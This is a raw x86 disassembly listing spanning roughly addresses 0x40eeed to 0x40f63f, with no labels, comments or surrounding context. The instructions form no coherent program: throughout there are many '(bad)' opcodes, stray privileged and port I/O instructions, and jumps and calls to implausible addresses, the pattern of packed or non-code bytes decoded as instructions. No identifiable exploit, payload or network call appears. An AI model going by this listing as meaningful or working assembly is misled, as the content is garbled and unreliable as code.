  40eeed:	cwde   
  40eeee:	ja     0x40eecc
  40eef0:	jmp    DWORD PTR [edi]
  40eef2:	std    
  40eef3:	inc    BYTE PTR [si-0x10]
  40eef7:	mov    esp,0x426b3140
  40eefc:	jae    0x40ef65
  40eefe:	(bad)  
  40eeff:	neg    bh
  40ef01:	add    BYTE PTR [ecx],bl
  40ef03:	rdseed esi
  40ef06:	(bad)  
  40ef07:	call   0x2ce5cad2
  40ef0c:	fs dec edi
  40ef0e:	out    dx,al
  40ef0f:	or     ah,bl
  40ef11:	dec    edi
  40ef12:	pop    eax
  40ef13:	or     ebx,edx
  40ef15:	or     BYTE PTR [ebx+0x9],cl
  40ef18:	push   esi
  40ef19:	not    edx
  40ef1b:	repz cmp DWORD PTR gs:[ebx-0x38],0xffffffe8
  40ef21:	cld    
  40ef22:	xchg   ah,bl
  40ef24:	paddusb mm7,QWORD PTR [esi-0x484dba9b]
  40ef2b:	fneni(8087 only) 
  40ef2d:	pop    ebx
  40ef2e:	xchg   edi,eax
  40ef30:	and    eax,0xf0dea771
  40ef35:	jo     0x40ef5b
  40ef37:	or     eax,0x712ef716
  40ef3c:	or     eax,0x5658fc3
  40ef41:	mul    DWORD PTR [esi+0x65]
  40ef44:	jae    0x40ef95
  40ef46:	jg     0x40ef23
  40ef48:	loopne 0x40efa5
  40ef4a:	add    edi,0xdb6f70ed
  40ef50:	les    ebx,FWORD PTR [ebx+0x30]
  40ef53:	int3   
  40ef54:	fnsave [eax+0x5f]
  40ef57:	fcmovne st,st(4)
  40ef59:	jo     0x40ef98
  40ef5b:	lea    esp,[ecx]
  40ef5d:	ret    
  40ef5e:	dec    esi
  40ef5f:	out    dx,eax
  40ef60:	call   0xbdb5acd5
  40ef65:	push   ss
  40ef66:	add    BYTE PTR [ecx+0x360427d1],ch
  40ef6c:	fstp   TBYTE PTR [eax-0x5a31eba5]
  40ef72:	jo     0x40ef27
  40ef74:	dec    esp
  40ef75:	clc    
  40ef76:	jo     0x40efe5
  40ef78:	pop    ebp
  40ef79:	imul   ebp,esi,0x86de0a22
  40ef7f:	push   ss
  40ef80:	test   DWORD PTR fs:[eax+0x19],esi
  40ef84:	lahf   
  40ef85:	jle    0x40eff7
  40ef87:	(bad)  
  40ef88:	out    dx,eax
  40ef89:	(bad)  
  40ef8a:	call   0x6f38cd10
  40ef8f:	inc    edi
  40ef90:	mov    eax,ds:0x6432a84a
  40ef95:	je     0x40eff4
  40ef97:	popa   
  40ef98:	fld    QWORD PTR [edi]
  40ef9a:	inc    ecx
  40ef9b:	or     eax,edi
  40ef9d:	dec    BYTE PTR [esi-0x1f]
  40efa0:	(bad)  
  40efa1:	enter  0x2e2b,0x9
  40efa5:	push   ebp
  40efa6:	jb     0x40f006
  40efa8:	mov    ebx,eax
  40efaa:	adc    eax,0x5cfe6339
  40efaf:	ja     0x40f011
  40efb1:	dec    edi
  40efb2:	es lahf 
  40efb4:	adc    bh,bh
  40efb6:	aam    0x4
  40efb8:	int3   
  40efb9:	inc    eax
  40efba:	jmp    0xe9703fb9
  40efbf:	xor    dl,BYTE PTR [eax]
  40efc1:	shl    dh,0xaf
  40efc4:	mov    bl,0x0
  40efc6:	jmp    0xf1853bfd
  40efcb:	add    BYTE PTR [ebx],dh
  40efcd:	or     DWORD PTR [eax],eax
  40efcf:	jmp    0xe734bccd
  40efd4:	or     DWORD PTR cs:[eax],eax
  40efd7:	push   ebx
  40efd8:	xor    eax,0x2d42ffef
  40efdd:	out    dx,eax
  40efde:	call   FWORD PTR [ebx+0x78]
  40efe1:	pop    eax
  40efe2:	dec    edi
  40efe3:	je     0x40ef9d
  40efe5:	pop    eax
  40efe6:	idiv   BYTE PTR [esi+0x3cfed3ce]
  40efec:	lds    esp,FWORD PTR [edx+0x74]
  40efef:	lods   eax,DWORD PTR ds:[esi]
  40eff0:	lea    eax,[esi+0x1032e92f]
  40eff6:	rcl    BYTE PTR ds:0xe8717228,0x32
  40effd:	or     DWORD PTR [eax+0x3f],ebp
  40f000:	int    0xc8
  40f002:	(bad)  
  40f003:	jmp    FWORD PTR [edi-0x5017f59f]
  40f009:	dec    ebx
  40f00a:	std    
  40f00b:	call   FWORD PTR [eax]
  40f00d:	loopne 0x40efdd
  40f00f:	lea    edx,[ebp-0x1f]
  40f012:	cmc    
  40f013:	dec    DWORD PTR [edi+0x3d]
  40f016:	push   eax
  40f017:	call   0x3e3c3b
  40f01c:	push   ecx
  40f01d:	xchg   edx,eax
  40f01e:	(bad)  
  40f020:	jg     0x40f016
  40f022:	out    0x35,al
  40f024:	xchg   esp,eax
  40f025:	repnz std 
  40f027:	push   0xffffffc8
  40f029:	aas    
  40f02a:	fild   QWORD PTR [eax-0x77]
  40f02d:	pop    es
  40f02e:	push   DWORD PTR [ebp-0x223c400]
  40f034:	dec    DWORD PTR [edi+0x22]
  40f037:	ror    BYTE PTR [eax-0x37],cl
  40f03a:	pop    es
  40f03b:	call   0xfe33b775
  40f040:	mov    DWORD PTR ds:0x2ffff5dd,edx
  40f046:	aas    
  40f047:	(bad)  
  40f048:	addr16 ss inc ebp
  40f04b:	aas    
  40f04c:	add    BYTE PTR [edi-0x60],bh
  40f04f:	(bad)  
  40f051:	pop    edi
  40f052:	repnz std 
  40f054:	xor    eax,0x3f9faa
  40f059:	cmp    dl,0x46
  40f05c:	(bad)  
  40f05d:	jg     0x40f043
  40f05f:	sub    esp,0x67
  40f062:	repnz std 
  40f064:	push   0x58
  40f066:	aas    
  40f067:	jmp    0xff4df9d4
  40f06c:	mov    ch,0x9c
  40f06e:	(bad)  
  40f070:	(bad)  
  40f071:	fbld   TBYTE PTR [ecx]
  40f073:	ror    BYTE PTR [eax+0x59],cl
  40f076:	or     eax,0xf256f9e8
  40f07b:	std    
  40f07c:	mov    DWORD PTR [ecx],esi
  40f07e:	cmc    
  40f07f:	pop    edx
  40f080:	test   BYTE PTR [esi],0x94
  40f083:	fdivr  st,st(7)
  40f085:	mov    fs,eax
  40f087:	fiadd  DWORD PTR [eax+0x31]
  40f08a:	jecxz  0x40f043
  40f08c:	(bad)  
  40f08e:	fld    TBYTE PTR [ebp-0x2]
  40f091:	and    al,0x7e
  40f093:	mov    edx,0xb8310040
  40f098:	dec    ecx
  40f099:	inc    ebp
  40f09a:	faddp  st(3),st
  40f09c:	jnp    0x40f022
  40f09e:	int    0xc3
  40f0a0:	ins    DWORD PTR es:[edi],dx
  40f0a1:	(bad)  
  40f0a2:	pop    ebx
  40f0a3:	jo     0x40f07f
  40f0a5:	hlt    
  40f0a6:	pop    ecx
  40f0a7:	mov    cl,0x2
  40f0a9:	inc    DWORD PTR [esp+eax*1+0x1bb6fe76]
  40f0b0:	cmp    dl,dl
  40f0b2:	stc    
  40f0b3:	mov    al,0x2
  40f0b5:	call   0xfeaea39e
  40f0ba:	test   al,0xed
  40f0bc:	(bad)  
  40f0bd:	not    BYTE PTR [esi-0x62437e05]
  40f0c3:	sti    
  40f0c4:	ins    DWORD PTR es:[edi],dx
  40f0c5:	(bad)  
  40f0c6:	xor    esp,esp
  40f0c8:	shl    DWORD PTR [edi+0x31],1
  40f0cb:	jo     0x40f12a
  40f0cd:	mov    ebp,0xe7fae576
  40f0d2:	sub    esi,DWORD PTR [eax-0x7a990193]
  40f0d8:	jae    0x40f0d0
  40f0da:	pop    esi
  40f0db:	inc    ebx
  40f0dc:	ins    BYTE PTR es:[edi],dx
  40f0dd:	je     0x40f108
  40f0df:	dec    eax
  40f0e0:	jge    0x40f121
  40f0e2:	dec    esi
  40f0e3:	push   ebx
  40f0e4:	ins    BYTE PTR es:[edi],dx
  40f0e5:	mov    ah,0x55
  40f0e7:	mov    ds:0x1d3efe6c,eax
  40f0ec:	cld    
  40f0ed:	out    0xb1,eax
  40f0ef:	xor    BYTE PTR [ebp-0x2],ch
  40f0f2:	fstp   QWORD PTR cs:[ebx-0xa]
  40f0f6:	or     DWORD PTR es:[esi+0x11a5006d],esp
  40f0fd:	xchg   ecx,eax
  40f0fe:	repnz push esi
  40f100:	bound  edx,QWORD PTR [ebp-0x6a933a93]
  40f106:	ins    DWORD PTR es:[edi],dx
  40f107:	pop    es
  40f108:	(bad)  
  40f109:	sti    
  40f10a:	sti    
  40f10b:	push   ss
  40f10c:	in     eax,dx
  40f10d:	sub    BYTE PTR [ebp-0x9],ch
  40f110:	popa   
  40f111:	cmp    esp,DWORD PTR [edi+eiz*8+0x61]
  40f115:	ins    DWORD PTR es:[edi],dx
  40f116:	ins    DWORD PTR es:[edi],dx
  40f117:	pop    ebp
  40f118:	adc    DWORD PTR [ecx-0x2a],edx
  40f11b:	push   ds
  40f11c:	bound  ebx,QWORD PTR [ebp+0x6d]
  40f11f:	popf   
  40f120:	inc    esp
  40f121:	pop    ebp
  40f122:	ins    DWORD PTR es:[edi],dx
  40f123:	iret   
  40f124:	popa   
  40f125:	sar    ebx,cl
  40f127:	into   
  40f128:	mov    BYTE PTR [esi+0x6d],al
  40f12b:	mov    edi,0xbf507361
  40f130:	popa   
  40f131:	xor    eax,0x2dc6585c
  40f136:	ins    DWORD PTR es:[edi],dx
  40f137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f138:	fwait
  40f139:	sbb    BYTE PTR [ebp-0x61],dh
  40f13c:	popa   
  40f13d:	adc    BYTE PTR ds:0x6d1561f2,cl
  40f143:	lds    esi,FWORD PTR [ebp+edx*1+0x6d]
  40f147:	xchg   DWORD PTR [eax-0x24],esi
  40f14a:	sar    BYTE PTR [edi+0x61],0xfd
  40f14e:	mov    dh,0x8e
  40f150:	pop    ecx
  40f151:	cmc    
  40f152:	ins    BYTE PTR es:[edi],dx
  40f153:	push   esi
  40f154:	rsm    
  40f156:	ins    BYTE PTR es:[edi],dx
  40f157:	addr16 popa 
  40f159:	fwait
  40f15a:	addr16 addr16 popa 
  40f15d:	fstp   QWORD PTR [ebx+0x0]
  40f160:	push   esp
  40f161:	(bad)  
  40f162:	aad    0x6c
  40f164:	dec    edi
  40f165:	fwait
  40f166:	enter  0x4774,0x61
  40f16a:	shl    BYTE PTR [eax-0x10],1
  40f16d:	popa   
  40f16e:	mov    ebp,0xff60ed6c
  40f173:	mov    edi,0xaefe5f12
  40f178:	xchg   ebp,eax
  40f179:	aad    0xfb
  40f17b:	xchg   ecx,eax
  40f17c:	sbb    eax,0x5be90030
  40f181:	dec    edx
  40f182:	pop    es
  40f183:	jmp    0x6b2c856f
  40f188:	outs   dx,BYTE PTR ds:[esi]
  40f189:	fs imul ebp,ecx,0xf4fed1d8
  40f190:	cli    
  40f191:	push   0x5f5c2904
  40f196:	mov    BYTE PTR [ecx+eiz*2],ah
  40f199:	call   0x6134c35f
  40f19e:	std    
  40f19f:	aam    0xda
  40f1a1:	push   0x5f5d5707
  40f1a6:	(bad)  
  40f1a7:	aam    0x56
  40f1a9:	pop    edi
  40f1aa:	je     0x40f19d
  40f1ac:	pop    edx
  40f1ad:	xor    BYTE PTR [eax+0x3e],al
  40f1b0:	inc    ebp
  40f1b1:	push   ecx
  40f1b2:	shr    ebp,0x32
  40f1b5:	mov    dh,0x8a
  40f1b7:	cmp    eax,0x26f34cb1
  40f1bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1bd:	adc    al,0xe8
  40f1bf:	xchg   edi,eax
  40f1c0:	aaa    
  40f1c1:	or     DWORD PTR [eax],eax
  40f1c3:	loop   0x40f1c5
  40f1c5:	repnz aam 0x3
  40f1c8:	and    al,dh
  40f1ca:	adc    eax,DWORD PTR [eax]
  40f1cc:	push   es
  40f1cd:	xchg   DWORD PTR [eax],edx
  40f1cf:	call   0x4a095b
  40f1d4:	loop   0x40f1c8
  40f1d6:	aam    0x3
  40f1d8:	and    al,dh
  40f1da:	adc    eax,DWORD PTR [eax]
  40f1dc:	jo     0x40f24e
  40f1de:	pop    eax
  40f1df:	(bad)  
  40f1e0:	push   esp
  40f1e1:	lds    esp,FWORD PTR [edi-0x6d]
  40f1e4:	sub    ebx,edx
  40f1e6:	pop    esi
  40f1e7:	mov    BYTE PTR [ecx+ebx*8],ah
  40f1ea:	pop    esi
  40f1eb:	je     0x40f1ed
  40f1ed:	je     0x40f1e3
  40f1ef:	jae    0x40f1e9
  40f1f1:	ja     0x40f24d
  40f1f3:	push   cs
  40f1f4:	call   0x3e94ad
  40f1f9:	adc    ecx,esp
  40f1fb:	jb     0x40f238
  40f1fd:	mov    eax,ds:0x86af24a
  40f202:	loope  0x40f247
  40f204:	hlt    
  40f205:	dec    eax
  40f206:	hlt    
  40f207:	jae    0x40f205
  40f209:	mov    al,0xb8
  40f20b:	imul   edi,edi,0x74be5fb7
  40f211:	out    dx,al
  40f212:	inc    ebx
  40f213:	dec    BYTE PTR [edi]
  40f215:	mov    bh,0xb2
  40f217:	std    
  40f218:	jne    0x40f1ea
  40f21a:	ret    
  40f21b:	cmc    
  40f21c:	ds push edi
  40f21e:	hlt    
  40f21f:	std    
  40f220:	jne    0x40f1e6
  40f222:	bnd jae 0x40f22d
  40f225:	jo     0x40f1ca
  40f227:	cmp    eax,0xf47700ff
  40f22c:	jae    0x40f222
  40f22e:	ja     0x40f28a
  40f230:	cli    
  40f231:	(bad)  
  40f232:	jge    0x40f297
  40f234:	out    0x14,al
  40f236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f237:	repnz std 
  40f239:	(bad)  
  40f23a:	fucom  st(7)
  40f23c:	out    0x25,al
  40f23e:	retf   0xfdf2
  40f241:	leave  
  40f242:	dec    edx
  40f243:	popa   
  40f244:	(bad)  
  40f245:	push   esp
  40f246:	adc    eax,ecx
  40f248:	add    esp,0x75fd3b3c
  40f24e:	test   bl,al
  40f250:	in     eax,dx
  40f251:	inc    esi
  40f252:	ja     0x40f246
  40f254:	or     eax,eax
  40f256:	in     eax,dx
  40f257:	or     BYTE PTR [esi-0x37],bl
  40f25a:	sbb    ah,BYTE PTR [ecx-0x2]
  40f25d:	mov    WORD PTR ds:0xfdff4ed5,cs
  40f263:	pusha  
  40f264:	out    0xa1,al
  40f266:	xor    DWORD PTR [edi],ebp
  40f268:	imul   edi,esi,0x3a
  40f26b:	mov    dl,0xf9
  40f26d:	adc    DWORD PTR [ecx+0x71],0x2
  40f271:	add    BYTE PTR [esi],dh
  40f273:	adc    al,0x68
  40f275:	out    0x35,eax
  40f277:	xor    ch,BYTE PTR [ebx-0x2]
  40f27a:	mov    eax,0xa4fe5825
  40f27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f280:	imul   esi,DWORD PTR [ebp+eax*1-0x80],0x4b19f7ef
  40f288:	(bad)  
  40f289:	inc    BYTE PTR [esi]
  40f28b:	in     al,dx
  40f28c:	out    dx,eax
  40f28d:	jmp    0x40f28f
  40f28f:	or     ah,dl
  40f291:	add    al,BYTE PTR [eax]
  40f293:	xor    eax,edi
  40f295:	or     BYTE PTR [ecx+0x70],ch
  40f298:	jo     0x40f26a
  40f29a:	out    0x76,eax
  40f29c:	sahf   
  40f29d:	add    al,BYTE PTR [eax]
  40f29f:	sub    dh,BYTE PTR [eax]
  40f2a1:	lock add al,0xc8
  40f2a4:	mov    BYTE PTR [edx],al
  40f2a6:	add    BYTE PTR [ecx],dh
  40f2a8:	jmp    0x40f31c
  40f2aa:	addr16 and al,0x49
  40f2ad:	ret    
  40f2ae:	call   esi
  40f2b0:	ficom  DWORD PTR [esi]
  40f2b2:	add    BYTE PTR [ecx],dh
  40f2b4:	jae    0x40f328
  40f2b6:	mov    BYTE PTR [eax+ecx*8],ah
  40f2b9:	fisubr DWORD PTR [eax+ebx*1]
  40f2bc:	mov    cl,0x2
  40f2be:	push   esi
  40f2bf:	mov    DWORD PTR [edx],edi
  40f2c1:	sbb    BYTE PTR [eax],al
  40f2c3:	xor    DWORD PTR [ebx+0x42],ebx
  40f2c6:	je     0x40f2fb
  40f2c8:	or     esi,ecx
  40f2ca:	mov    DWORD PTR [ecx],esp
  40f2cc:	call   0xade9d5a0
  40f2d1:	pop    esi
  40f2d2:	addr16 inc esi
  40f2d4:	jns    0x40f299
  40f2d6:	inc    DWORD PTR [eax+ecx*1]
  40f2d9:	adc    al,0x2e
  40f2db:	xor    DWORD PTR [eax-0x3],esi
  40f2de:	mov    edi,0x5ceb08e4
  40f2e3:	cmc    
  40f2e4:	xchg   ecx,eax
  40f2e5:	fcomp  st(4)
  40f2e7:	pop    ds
  40f2e8:	lock daa 
  40f2ea:	add    al,0x59
  40f2ec:	into   
  40f2ed:	cld    
  40f2ee:	add    esi,DWORD PTR [ecx]
  40f2f0:	or     bh,BYTE PTR [ecx+0x3cbd007b]
  40f2f6:	push   eax
  40f2f7:	pop    ss
  40f2f8:	cwde   
  40f2f9:	enter  0xd1e8,0xe
  40f2fd:	outs   dx,BYTE PTR ds:[esi]
  40f2fe:	sti    
  40f2ff:	add    esi,DWORD PTR [ecx]
  40f301:	adc    ch,BYTE PTR [ecx-0x1e8dcf11]
  40f307:	jge    0x40f347
  40f309:	xchg   ecx,eax
  40f30a:	cmp    edx,DWORD PTR [ecx-0x47]
  40f30d:	ret    
  40f30e:	mov    al,0x7d
  40f310:	jne    0x40f377
  40f312:	scas   al,BYTE PTR es:[edi]
  40f313:	add    al,0x31
  40f315:	xchg   edx,eax
  40f316:	and    ecx,DWORD PTR [esp+esi*8+0x8]
  40f31a:	jmp    0x6d7e5087
  40f31f:	out    dx,eax
  40f320:	(bad)  
  40f321:	pop    ebp
  40f322:	(bad)  
  40f324:	into   
  40f325:	jns    0x40f385
  40f327:	imul   ecx,edi,0xbb64bb92
  40f32d:	ret    
  40f32e:	inc    esp
  40f32f:	jl     0x40f35f
  40f331:	xchg   ebx,eax
  40f332:	fwait
  40f333:	push   eax
  40f334:	stos   DWORD PTR es:[edi],eax
  40f335:	ret    
  40f336:	and    BYTE PTR [esi+edi*1-0x77],bh
  40f33a:	test   BYTE PTR [ebx],0x36
  40f33d:	test   BYTE PTR [eax+ebp*2-0x10daa261],dl
  40f344:	mov    dh,BYTE PTR [eax-0x38]
  40f347:	ret    0x5d8f
  40f34a:	arpl   WORD PTR [edi-0x46ff476a],di
  40f350:	neg    DWORD PTR [ebp+0x5]
  40f353:	pop    ebp
  40f354:	jbe    0x40f311
  40f356:	das    
  40f357:	inc    esi
  40f358:	add    BYTE PTR [edx],bh
  40f35a:	or     DWORD PTR [eax],eax
  40f35c:	pushf  
  40f35d:	in     eax,0x71
  40f35f:	(bad)  
  40f360:	je     0x40f3c8
  40f362:	gs pop esp
  40f364:	sub    al,0xc8
  40f366:	pop    esi
  40f367:	or     ch,BYTE PTR [ecx-0x1697cfa2]
  40f36d:	imul   ecx,eax,0xffffffff
  40f370:	cmp    ch,bl
  40f372:	jo     0x40f3b7
  40f374:	(bad)  
  40f375:	leave  
  40f376:	int    0x67
  40f378:	sbb    DWORD PTR ds:[eax+eax*1],0x41
  40f37d:	sub    eax,0xfa6fef09
  40f382:	stc    
  40f383:	push   0xfeb92d28
  40f388:	adc    al,0xd
  40f38a:	and    eax,DWORD PTR gs:[ecx]
  40f38d:	cwde   
  40f38e:	pop    ebx
  40f38f:	out    0xb1,eax
  40f391:	repnz pop ebx
  40f393:	(bad)  
  40f394:	mov    al,0x6c
  40f396:	add    al,0x0
  40f398:	adc    al,0x6c
  40f39a:	jo     0x40f31e
  40f39c:	lods   eax,DWORD PTR ds:[esi]
  40f39d:	dec    esi
  40f39e:	repnz inc DWORD PTR [edx]
  40f3a1:	lahf   
  40f3a2:	pop    ebx
  40f3a3:	je     0x40f396
  40f3a5:	jp     0x40f409
  40f3a7:	cmp    al,0x5e
  40f3a9:	pop    ecx
  40f3aa:	xchg   ecx,eax
  40f3ab:	inc    esp
  40f3ac:	push   ebp
  40f3ad:	in     al,0x2
  40f3af:	call   esp
  40f3b1:	mov    edx,0x4946a464
  40f3b6:	pop    ebx
  40f3b7:	imul   ecx,DWORD PTR [edx],0x4107d518
  40f3bd:	add    BYTE PTR [ebp+0x7c2efe5b],dh
  40f3c3:	add    bh,bh
  40f3c5:	pushf  
  40f3c6:	call   0x675b:0x191e9064
  40f3cd:	jmp    0x81fe6004
  40f3d2:	jge    0x40f3c5
  40f3d4:	inc    eax
  40f3d5:	add    BYTE PTR [eax-0x669701c0],cl
  40f3db:	or     bh,bh
  40f3dd:	jne    0x40f42f
  40f3df:	rol    ch,0x69
  40f3e2:	dec    edi
  40f3e3:	in     al,0xfd
  40f3e5:	jne    0x40f433
  40f3e7:	in     al,0x73
  40f3e9:	or     BYTE PTR [eax-0xe],ah
  40f3ec:	cmp    edi,edi
  40f3ee:	pop    edi
  40f3ef:	push   ds
  40f3f0:	rol    DWORD PTR [eax+ecx*2],0x39
  40f3f4:	mov    esp,ebp
  40f3f6:	leave  
  40f3f7:	enter  0xf7d6,0xef
  40f3fb:	jecxz  0x40f388
  40f3fd:	inc    ebp
  40f3fe:	fdiv   QWORD PTR [edi*8+0x73e2fc75]
  40f405:	or     al,al
  40f407:	jns    0x40f433
  40f409:	add    BYTE PTR [eax],bl
  40f40b:	pop    edi
  40f40c:	mov    esi,0xffc5950f
  40f411:	dec    DWORD PTR [eax]
  40f413:	sbb    eax,DWORD PTR [eax+edi*8+0x8]
  40f417:	or     BYTE PTR [eax],al
  40f419:	add    BYTE PTR [edi-0x28000db7],dl
  40f41f:	pop    es
  40f420:	add    BYTE PTR [edx+0x0],ch
  40f423:	enter  0xfe41,0x69
  40f427:	enter  0xfe41,0x8c
  40f42b:	xchg   ebp,eax
  40f42c:	jmp    0x40f47c
  40f42e:	lea    edx,[ebp-0x27]
  40f431:	cmc    
  40f432:	jmp    FWORD PTR [edi+0x35]
  40f435:	std    
  40f436:	jne    0x40f4a8
  40f438:	in     al,0x73
  40f43a:	cld    
  40f43b:	add    BYTE PTR [edx+ebp*1],bh
  40f43e:	add    BYTE PTR [eax-0x6a8b41a2],bl
  40f444:	mov    esp,0x7880181
  40f449:	push   0xfe44c0ae
  40f44e:	(bad)  
  40f44f:	xor    DWORD PTR [ebp-0xa],edi
  40f452:	out    0xb9,eax
  40f454:	scas   al,BYTE PTR es:[edi]
  40f455:	gs (bad) 
  40f457:	loope  0x40f42f
  40f459:	push   ebx
  40f45a:	mov    WORD PTR [ebp+edx*2-0x7e990193],?
  40f461:	shl    bh,1
  40f463:	mov    DWORD PTR [esi-0x1357019b],ebp
  40f469:	dec    edx
  40f46a:	test   BYTE PTR [esi+0x3a],0x5a
  40f46e:	std    
  40f46f:	push   es
  40f470:	xor    esp,DWORD PTR [ebp+0x69]
  40f473:	xor    edx,ecx
  40f475:	retf   0xf068
  40f478:	jno    0x40f4df
  40f47a:	mov    ah,0x9
  40f47c:	xchg   esp,eax
  40f47d:	gs (bad) 
  40f47f:	es push ds
  40f481:	cld    
  40f482:	out    0x30,eax
  40f484:	das    
  40f485:	inc    BYTE PTR [bx+si]
  40f488:	test   al,0xed
  40f48a:	jb     0x40f482
  40f48c:	push   cs
  40f48d:	jl     0x40f467
  40f48f:	dec    DWORD PTR [esi+0x3140dd0c]
  40f495:	mov    ebp,DWORD PTR [edi+0x6583fed7]
  40f49b:	(bad)  
  40f49c:	fs pop eax
  40f49e:	pop    edx
  40f49f:	in     eax,0x73
  40f4a1:	shl    DWORD PTR [ebp-0x78],cl
  40f4a4:	mov    ah,0xdc
  40f4a6:	ins    DWORD PTR es:[edi],dx
  40f4a7:	(bad)  
  40f4a8:	(bad)  
  40f4a9:	add    ch,BYTE PTR ss:[eax+0x5c]
  40f4ad:	cmp    ebx,eax
  40f4af:	inc    edi
  40f4b1:	jge    0x40f4fd
  40f4b3:	idiv   BYTE PTR [esi+0x297465cb]
  40f4b9:	mov    eax,0x1bae4139
  40f4be:	jl     0x40f444
  40f4c0:	cdq    
  40f4c1:	sbb    esp,DWORD PTR [esi-0x2]
  40f4c4:	lods   al,BYTE PTR ds:[esi]
  40f4c5:	in     eax,0x46
  40f4c7:	not    BYTE PTR [esi+0x16d32609]
  40f4cd:	ror    DWORD PTR [edi+0x5b5b86c4],cl
  40f4d3:	dec    ebx
  40f4d4:	xchg   DWORD PTR [edx+0xd],ebx
  40f4d7:	data16 std 
  40f4d9:	adc    BYTE PTR [ecx],dl
  40f4db:	call   0x65ad:0x7bfd59f0
  40f4e2:	std    
  40f4e3:	gs pop edi
  40f4e5:	out    dx,eax
  40f4e6:	call   0x2831a6c6
  40f4eb:	add    al,0x0
  40f4ed:	dec    esi
  40f4ee:	xchg   esp,eax
  40f4ef:	shr    BYTE PTR [ebp+0x47],0x5a
  40f4f3:	aad    0xef
  40f4f5:	ss jno 0x40f570
  40f4f8:	ret    0x5a37
  40f4fb:	outs   dx,DWORD PTR ds:[esi]
  40f4fc:	jg     0x40f50c
  40f4fe:	push   edx
  40f4ff:	mov    ebp,0xb89bb365
  40f504:	ins    DWORD PTR es:[edi],dx
  40f505:	pop    ds
  40f506:	pop    edx
  40f507:	call   0x63c780fb
  40f50c:	pop    eax
  40f50d:	pop    es
  40f50e:	pop    edx
  40f50f:	popf   
  40f510:	add    al,0x7d
  40f512:	out    0x69,eax
  40f514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f515:	push   ss
  40f516:	push   edx
  40f517:	lea    esp,[ebp-0xa]
  40f51a:	aad    0x1f
  40f51c:	fsub   st(6),st
  40f51e:	pop    ecx
  40f51f:	lea    esp,[esi+0x5bd8d3e7]
  40f525:	fistp  DWORD PTR ds:0x93d7656e
  40f52b:	pop    eax
  40f52c:	ins    DWORD PTR es:[edi],dx
  40f52d:	iret   
  40f52e:	pop    ecx
  40f52f:	pop    ebp
  40f530:	out    dx,eax
  40f531:	ss jno 0x40f4d9
  40f534:	daa    
  40f535:	mov    esi,0xcaaf4d59
  40f53a:	push   ecx
  40f53b:	inc    ebp
  40f53c:	gs scas eax,DWORD PTR es:[edi]
  40f53e:	rcr    eax,cl
  40f540:	pop    ebx
  40f541:	icebp  
  40f542:	sbb    al,0x0
  40f544:	ss adc al,0x5b
  40f547:	mov    ah,0x41
  40f549:	add    al,0x5b
  40f54b:	(bad)  
  40f54c:	es sahf 
  40f54e:	or     eax,ebp
  40f550:	fiadd  DWORD PTR [eax]
  40f552:	dec    esi
  40f553:	pop    edx
  40f554:	(bad)  
  40f555:	push   ss
  40f556:	into   
  40f557:	cmp    eax,0x5b0c0ef6
  40f55c:	mov    ah,0xd
  40f55e:	fcomp  QWORD PTR [edx-0x2]
  40f561:	(bad)  
  40f562:	push   edi
  40f563:	or     eax,ebp
  40f565:	cli    
  40f566:	or     DWORD PTR [edx-0x2],ebx
  40f569:	out    dx,al
  40f56a:	xchg   DWORD PTR [ecx],edi
  40f56c:	mul    dh
  40f56e:	aad    0x5a
  40f570:	je     0x40f56b
  40f572:	jmp    0x745a:0xd5d63bf8
  40f579:	stc    
  40f57a:	int    0x94
  40f57c:	xlat   BYTE PTR ds:[ebx]
  40f57d:	mov    esi,0x34fe5795
  40f582:	and    eax,0x95b77171
  40f587:	push   edi
  40f588:	(bad)  
  40f589:	je     0x40f5f5
  40f58b:	pop    edi
  40f58c:	(bad)  
  40f58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f58e:	push   0x6a
  40f590:	cmp    eax,0xb4578d9e
  40f595:	cdq    
  40f596:	lea    edx,[edi-0x2]
  40f599:	and    DWORD PTR [ebp+0x16],0x9d5586ff
  40f5a0:	jmp    0x40f618
  40f5a2:	dec    ebp
  40f5a3:	push   edi
  40f5a4:	out    0xa5,eax
  40f5a6:	adc    al,0x58
  40f5a8:	(bad)  
  40f5a9:	outs   dx,BYTE PTR ds:[esi]
  40f5aa:	xchg   DWORD PTR [eax-0xa],esi
  40f5ad:	push   bp
  40f5af:	jo     0x40f571
  40f5b1:	pop    ds
  40f5b2:	dec    esp
  40f5b3:	push   edi
  40f5b4:	(bad)  
  40f5b5:	pushf  
  40f5b6:	add    BYTE PTR [esi+0x5f],bl
  40f5b9:	dec    BYTE PTR [esi+0x5a]
  40f5bc:	sahf   
  40f5bd:	cmp    eax,0xfdecf700
  40f5c2:	mov    ch,0xf8
  40f5c4:	in     al,0xfd
  40f5c6:	push   eax
  40f5c8:	jo     0x40f606
  40f5ca:	inc    DWORD PTR [edi-0x13]
  40f5cd:	inc    ebx
  40f5ce:	clc    
  40f5cf:	and    DWORD PTR [ebp-0x12d80004],ebx
  40f5d5:	jae    0x40f5d3
  40f5d7:	xor    BYTE PTR ds:0x13880029,dl
  40f5dd:	ror    DWORD PTR [eax+ebx*2],0x47
  40f5e1:	mov    esp,ebp
  40f5e3:	fist   DWORD PTR [edi]
  40f5e5:	sti    
  40f5e6:	push   0x48
  40f5e8:	xor    cl,BYTE PTR [ecx-0x1]
  40f5eb:	fst    QWORD PTR [ebx-0x1a]
  40f5ee:	mov    ebp,0x89fdec13
  40f5f3:	or     eax,0x5075fde9
  40f5f8:	fs xor eax,0xff0d0969
  40f5fe:	xor    eax,0x3f44ca
  40f603:	add    BYTE PTR [ecx-0x14180005],dh
  40f609:	jae    0x40f613
  40f60b:	jo     0x40f601
  40f60d:	push   0x641841
  40f612:	add    BYTE PTR [eax],bl
  40f614:	mov    esi,fs
  40f616:	loop   0x40f5bd
  40f618:	jmp    0x40f617
  40f61a:	inc    DWORD PTR [eax]
  40f61c:	sbb    eax,0xe075fde9
  40f621:	jecxz  0x40f5f1
  40f623:	cmp    esp,DWORD PTR [edi-0x14]
  40f626:	mov    edx,0x8b550bcc
  40f62c:	push   esp
  40f62d:	nop
  40f62e:	ret    0xe2fc
  40f631:	or     ebp,DWORD PTR [edx+0x4c]
  40f634:	xor    al,BYTE PTR ds:0x31e8
  40f639:	ss sbb eax,0xc8e8b6ff
  40f63f:	sti    
